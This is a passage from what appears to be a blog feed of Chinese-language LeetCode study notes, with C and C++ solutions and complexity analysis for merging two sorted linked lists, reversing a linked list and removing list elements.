class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Node *ptr1, *ptr2, *previous, *preceding; </span><br><span class="line">ptr1 = list1;</span><br><span class="line">ptr2 = list2;</span><br><span class="line">preceding = ptr1;</span><br><span class="line">previous = ptr2;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Empty lists</span></span><br><span class="line"><span class="keyword">if</span>(ptr1==<span class="literal">NULL</span> &amp;&amp; ptr2==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="comment">//return empty list</span></span><br><span class="line">    <span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ptr1 == <span class="literal">NULL</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> ptr2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ptr2 == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (ptr1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span> (ptr2 !=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr1-&gt; val &lt;= ptr2-&gt;val)&#123;</span><br><span class="line">            preceding = ptr1-&gt;next;</span><br><span class="line">            ptr1-&gt;next = ptr2;</span><br><span class="line">            previous-&gt;next = ptr1;</span><br><span class="line">            previous = previous -&gt; next;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// //Tail Node</span></span><br><span class="line">            <span class="comment">// if ( (ptr1-&gt; val == ptr2-&gt;val) &amp;&amp; (ptr1-&gt;next == NULL))&#123;</span></span><br><span class="line">            <span class="comment">//     ptr2 -&gt; next = ptr1;</span></span><br><span class="line">            <span class="comment">//     break;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            previous = ptr2;</span><br><span class="line">            <span class="comment">//traverse list2</span></span><br><span class="line">            ptr2 = ptr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ptr1 = preceding;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list2;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但這種做法會在 <code>previous</code>, <code>preceding</code>更新指標時候會出問題，並且還需要額外判斷 Tail node，由於太過麻煩後續我就放棄這種做法</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">mergeTwoLists</span><span class="params">(<span class="keyword">struct</span> ListNode* list1, <span class="keyword">struct</span> ListNode* list2)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">ptr1</span>, *<span class="title">ptr2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  <span class="title">dummy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">tail</span> =</span> &amp;dummy;</span><br><span class="line">    ptr1 = list1;</span><br><span class="line">    ptr2 = list2;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ptr1 != <span class="literal">NULL</span> &amp;&amp; ptr2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr1-&gt;val &lt;= ptr2-&gt;val)&#123;</span><br><span class="line">            tail-&gt;next = ptr1;</span><br><span class="line">            ptr1 = ptr1-&gt;next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail-&gt;next = ptr2;</span><br><span class="line">            ptr2 = ptr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tail = tail -&gt; next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptr1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail-&gt;next = ptr1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ptr2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail-&gt;next = ptr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>我後面取而代之的是，建立新的 Linked List 在比較兩個lists的時候就放到新創建的list中</p><ul><li>先建立一個Linked List，將要返回的內容串接在後面</li><li>比較兩個Linked List 的value大小，將較小的加入dummy list</li><li>加入後，原先list的元素會少一個，因此會需要將指標更新 (<code>ptr2 = ptr2-&gt;next;</code>, <code>ptr1 = ptr1-&gt;next;</code>)</li><li>結束後，若還有剩餘的元素在，就在直接加進 dummy 串列中</li><li>最後回傳 dummyy串列中第一個有值的位址</li></ul><blockquote><p>參考： <a href="https://hackmd.io/@ChangTL/S1z11PWJv#021-Merge-Two-Sorted-Lists">https://hackmd.io/@ChangTL/S1z11PWJv#021-Merge-Two-Sorted-Lists</a></p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/21/results.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 😉😉😉😉Please upvote if it helps 😉😉😉😉</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ListNode* <span class="title function_">mergeTwoLists</span><span class="params">(ListNode* list1, ListNode* list2)</span> &#123;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// if list1 happen to be NULL</span></span><br><span class="line"><span class="comment">// we will simply return list2.</span></span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> list2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if list2 happen to be NULL</span></span><br><span class="line"><span class="comment">// we will simply return list1.</span></span><br><span class="line">        <span class="keyword">if</span>(list2 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> list1;</span><br><span class="line">        </span><br><span class="line">        ListNode * ptr = list1;</span><br><span class="line">        <span class="keyword">if</span>(list1 -&gt; val &gt; list2 -&gt; val)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = list2;</span><br><span class="line">            list2 = list2 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            list1 = list1 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *curr = ptr;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// till one of the list doesn&#x27;t reaches NULL</span></span><br><span class="line">        <span class="keyword">while</span>(list1 &amp;&amp;  list2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(list1 -&gt; val &lt; list2 -&gt; val)&#123;</span><br><span class="line">                curr-&gt;next = list1;</span><br><span class="line">                list1 = list1 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                curr-&gt;next = list2;</span><br><span class="line">                list2 = list2 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            curr = curr -&gt; next;</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adding remaining elements of bigger list.</span></span><br><span class="line">        <span class="keyword">if</span>(!list1)</span><br><span class="line">            curr -&gt; next = list2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curr -&gt; next = list1;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>Time Complexity:</strong> $O(n+m)$</li><li><strong>Space Complexity:</strong> $O(1)$</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/21/results2.png"></p><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><p>在這個合併兩個已排序linked list的函數中，我們主要考慮走訪每個節點所需的時間，<strong>在最壞情況下，兩個linked list中的每個節點都需要被traverse一次</strong></p><ul><li>假設 <code>list1</code> 有<code>n</code> 個節點，而 <code>list2</code> 有 <code>m</code> 個節點</li><li>因此，整個過程中，走訪的節點總數是 <code>n + m</code></li><li>節點的比較和鏈結操作都是常數時間操作</li><li>所以，時間複雜度是 $O(n + m)$</li></ul><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><h2 id="空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：-使用了一個-dummy-節點，它的空間是常數級別的-O-1-其餘使用的指標-如-ptr1-ptr2-tail-也都是常數級別的空間-所以空間複雜度會是-O-1"><a href="#空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：-使用了一個-dummy-節點，它的空間是常數級別的-O-1-其餘使用的指標-如-ptr1-ptr2-tail-也都是常數級別的空間-所以空間複雜度會是-O-1" class="headerlink" title="空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：- 使用了一個 dummy 節點，它的空間是常數級別的 $O(1)$- 其餘使用的指標 (如 ptr1, ptr2, tail) 也都是常數級別的空間- 所以空間複雜度會是 $O(1)$"></a>空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：<br>- 使用了一個 dummy 節點，它的空間是常數級別的 $O(1)$<br>- 其餘使用的指標 (如 <code>ptr1</code>, <code>ptr2</code>, <code>tail</code>) 也都是常數級別的空間<br>- 所以空間複雜度會是 $O(1)$</h2>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反向鏈結串列 | Easy |LeetCode#206 Reverse Linked List</title>
      <link href="/posts/a6b83df3.html"/>
      <url>/posts/a6b83df3.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/206/question-1.png"></p><p><img src="/img/LeetCode/206/question-2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 給定一個 linked list 的 <code>head</code>，希望整個 list 反轉，並且回傳反轉後的list</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 定義節點結構</span><br><span class="line">2. 建立 linked list</span><br><span class="line">3. reverseList()</span><br><span class="line">4. 建立暫存節點，用來存放下一個節點的位址，也需要站存上一個節點的位址</span><br><span class="line">4-1. 將下一個節點的位址鏈結到上一個節點</span><br><span class="line">4-2. 更新暫時存節點</span><br><span class="line">4-3 . 更新前一個節點</span><br><span class="line">4-4.  移動至下一個節點</span><br><span class="line">5. 更新初始節點指標</span><br><span class="line">6. 回傳初始節點指標</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/206/algo.png"></p><blockquote><p>後來我發現 <code>head</code> 跟tail 其實可以不用各別分開處理</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">tempNode</span>, *<span class="title">current</span>, *<span class="title">previous</span>;</span>    </span><br><span class="line">    current = head;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        tempNode = current-&gt; next;</span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        previous = current;</span><br><span class="line">        current = tempNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> previous;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li><p>一開始宣告了三個指標變數:</p><ul><li><code>tempNode</code>: 用於臨時保存當前節點的下一個節點</li><li><code>current</code>: 用於走訪 linked list 的當前節點</li><li><code>previous</code>: 用於保存當前節點的前一個節點，最終會成為反轉後的新的頭節點</li></ul></li><li><p>初始化:</p><ul><li>將 <code>current</code> 初始化為 <code>head</code>，即list的頭節點</li><li>將 <code>previous</code> 初始化為 NULL，因為反轉後的新頭節點的下一個節點應為 NULL</li></ul></li><li><p>迴圈部分:</p><ul><li>只要還有節點需要處理，就繼續反轉，直到遇到 NULL</li><li>一開始先保存當前節點的下一個節點，這樣在改變指標方向後不會丟失剩下的 list</li><li><strong>將當前節點的 <code>next</code> 指標指向前一個節點 (<code>previous</code>)，這是實現反轉的關鍵一步</strong></li><li><code>previous = current</code>: 移動 previous 指標，使其指向當前節點，為下一次迴圈做準備</li><li><code>current = tempNode</code>: 移動 current 指標，使其指向原來的下一個節點，繼續處理下一個節點</li></ul></li><li><p>當迴圈結束時，<code>previous</code> 指向的是反轉後的 list 的頭節點，因為當 <code>current</code> 為 NULL 時， <code>previous</code> 剛好是最後一個非空節點</p></li><li><p>回傳 <code>previous</code></p></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/206/results.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span>&#123;</span><br><span class="line">    <span class="comment">// Special case...</span></span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)  <span class="keyword">return</span> head;</span><br><span class="line">    <span class="comment">// Initialize prev pointer as the head...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">prev</span> =</span> head;</span><br><span class="line">    <span class="comment">// Initialize curr pointer as the next pointer of prev...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">curr</span> =</span> prev-&gt;next;</span><br><span class="line">    <span class="comment">// Initialize next of head pointer as NULL...</span></span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Run a loop till curr and prev points to NULL...</span></span><br><span class="line">    <span class="keyword">while</span>(prev != <span class="literal">NULL</span> &amp;&amp; curr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// Initialize next pointer as the next pointer of curr...</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span> =</span> curr-&gt;next;</span><br><span class="line">        <span class="comment">// Now assign the prev pointer to curr’s next pointer.</span></span><br><span class="line">        curr-&gt;next = prev;</span><br><span class="line">        <span class="comment">// Assign curr to prev, next to curr...</span></span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;    <span class="comment">// Return the prev pointer to get the reverse linked list...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這是解答區其他人回覆的做法，也是 0ms，他的做法跟我的大同小異，但他的會需要額外去判斷是否為 empty list 並且把 <code>head</code> 指向 NULL 單獨出來做。</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/206/results-2.png"></p><blockquote><p>看來這樣要多判斷的狀況，會添加將近 3ms…</p></blockquote><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><ul><li>時間複雜度: $O(n)$: while迴圈這部分是traverse鏈結串列的主要邏輯，遍歷整個鏈結串列的時間複雜度是 $O(n)$， <code>n</code> 會是節點數量</li><li>空間複雜度 $O(1)$: 三個指標（<code>tempNode</code>, <code>current</code>, <code>previous</code>）：這些變量佔用常數空間  $O(1)$。</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鏈結串列刪除元素 | Easy |LeetCode#203 Remove Linked List Elements</title>
      <link href="/posts/2db2c541.html"/>
      <url>/posts/2db2c541.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/203/question1.png"></p><p><img src="/img/LeetCode/203/question2.png"></p><ul><li>題目難度: Easy</li><li>題目描述: 給定一個 Linked List 的 <code>head</code> 以及想要刪除節點的數值 <code>val</code>，要我們移除list中<strong>所有等於 <code>val</code> 的節點</strong>，所以如果所有節點數值都等於 <code>val</code> 則結果會是一個 emptt list</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 定義節點結構</span><br><span class="line">2. 建立 linked list</span><br><span class="line">3. removeElements</span><br><span class="line">3-1. 宣告暫存空間</span><br><span class="line">3-2  判斷是否是 Empty List</span><br><span class="line">3-3. 走訪整個List</span><br><span class="line">3-4. 判斷是否等於 val，如果等於:那就將前一個節點連接到後一個節點，並釋放記憶體以刪除 val 所在節點</span><br><span class="line">3-5  回傳head</span><br></pre></td></tr></table></figure><p>這是看到題目後一開始的主要想法，並且一開始很天真的想說還需要考慮刪除節點在 Head, 中間 以及 Tail 三種狀況，實作後才發現其實只需要判斷頭跟其他地方就好，Tail 應該不用單獨拿出來處理。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">previous</span> =</span> head;</span><br><span class="line">    <span class="comment">// empty list</span></span><br><span class="line">    <span class="keyword">if</span> (ptr== <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;empty list\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> ptr;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;val == val)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">tmp</span> =</span> ptr;</span><br><span class="line">            <span class="keyword">if</span>( ptr == head )&#123;</span><br><span class="line">                head = ptr-&gt;next;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;   </span><br><span class="line">                previous-&gt;next = ptr-&gt;next;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(tmp);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            previous = ptr;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>程式碼在一開始宣告了兩個指標，分別用來遍歷鏈結串列 (<code>ptr</code>) 和跟踪當前節點的前一個節點 (<code>previous</code>)</li><li>首先判斷 Empty List 的狀況，若發現 emptry list 回傳 head，原封不動的還回去</li><li>接著，若節點不是空的，則開始遍歷整個List，如果發現節點的資料等於 <code>val</code> (<code>if ( ptr-&gt;val == val)</code>)，則可以後續判斷是否是在頭節點還是其他地方，如果資料不匹配，那就直接換下一個節點 ，所以要更新 <code>previous</code> 指標以及 <code>ptr</code>指標 (<code>previous = ptr;</code>, <code>ptr = ptr-&gt;next;</code>)</li><li>當然，還需要宣告一個暫存用的指標，來存放要被刪除的節點位址</li><li>接著判斷 <code>ptr == head </code> 是否為頭節點，如果是那就更新 <code>head</code> 指標，以及 <code>ptr</code> 指標，來繼續走訪，並且透過 free 來釋放記憶體位址</li><li>如果不是頭節點，也就是中間或tail節點，這時需要將前一個節點指向 <code>val</code> 的後一個節點 (<code>previous-&gt;next = ptr-&gt;next;</code>)，後續一樣再用 <code>ptr = ptr-&gt;next;</code> 來繼續走訪 list </li><li>回傳 <code>head</code></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/203/result1.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>上面的做法使用了兩個指標來儲存狀態，其實也有辦法減少到使用一個指標</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">// Apporach-2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> =</span> head;</span><br><span class="line">    <span class="comment">// empty list</span></span><br><span class="line">    <span class="keyword">if</span> (ptr== <span 